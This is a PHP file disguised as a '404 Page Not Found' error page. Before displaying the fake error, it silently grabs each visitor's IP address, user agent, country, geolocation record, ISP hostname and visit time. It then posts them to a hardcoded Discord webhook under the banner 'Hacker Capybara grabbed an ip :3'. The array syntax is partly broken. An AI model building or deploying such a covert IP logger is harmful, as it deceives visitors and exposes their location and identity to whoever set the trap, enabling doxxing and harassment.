<?php

$url = "https://discord.com/api/webhooks/993516826594136165/ds3AArH5Iccs5HGFHATxv5Edc8FGfUkqhRrSE1yMS6Kp325UCkTSgj1ybbAL7PGQxwT4";
$user_ip = 'Ip Adress : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$user_useragent = 'User Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$user_clickdate = date('d-m-Y H:i:s') . "\r\n";
$user_country = 'Pays : ' . geoip_country_name_by_name($_SERVER['REMOTE_ADDR']) . "\r\n";
$user_record = geoip_record_by_name($_SERVER['REMOTE_ADDR']);
$user_fai = 'FAI : ' . gethostbyaddr($_SERVER['REMOTE_ADDR']) . "\r\n";

$hookObject = json_encode([

    "content" => "",

    "username" => "HackerCapybara",

    "avatar_url" => "https://media.discordapp.net/attachments/936949039428157490/1001079967066624030/unknown.png",

    "tts" => false,

    "embeds" => [
        [
            "title" => "Hacker Capybara grabbed an ip :3",
            
            "type" => "rich",
            
            "description" => "",
            
            "url" => "",
              
            "color" => hexdec( "FFFFFF" ),
            
            "footer" => [
                "text" => "Pornhub",
                "icon_url" => "https://pornhub.com"
            ],
            
            "image" => [
                "url" => ""
            ],
            
            "thumbnail" => [
                "url" => ""
            ],
            
            "author" => [
                "name" => "BL4CK",
                
            ],
            
            "fields" => [
                [
                    "name" => "IP",
                    "value" => "$user_ip",
                    "inline" => true
                ],
                // Field 2
                [
                    "name" => "User Agent",
                    "value" => "$user_useragent",
                    "inline" => true
                ],
                // Field 3
                [
                    "name" => "Country",
                    "value" => "$user_country",
                    "inline" => true
                ]

                [
                    "name" => "FAI",
                    "value" => "$user_fai"
                    "inline" => true

                ]
                
                [
                    "name" => "Record"
                    "value" => "$user_record"
                    "inline" => true
                ]

                [
                    "name" => "Click date"
                    "value" => "$user_clickdate"
                ]
            ]
        ]
    ]
    
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Length" => strlen( $hookObject ),
        "Content-Type" => "application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>404 Not Found</title>
  <style type="text/css">
  	.page {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    min-height: 100vh;
		}
	.main {
    -webkit-box-flex: 1;
    -ms-flex: 1 1 70%;
    flex: 1 1 70%;
    box-sizing: border-box;
    padding: 10rem 5rem 5rem;
    min-height: 100vh;
		}
	.error-code {
    color: #f47755;
    font-size: 8rem;
    line-height: 1;
		}
	p.lead {
    font-size: 1.6rem;
    color: #4f5a64;
		}
  </style>
</head>
<body>
<div class="page">
  <div class="main">
    <h1>Server Error</h1>
    <div class="error-code">404</div>
    <h2>Page Not Found</h2>
    <p class="lead">This page either doesn't exist, or it moved somewhere else.</p>
    <hr/>
</div>
</body>

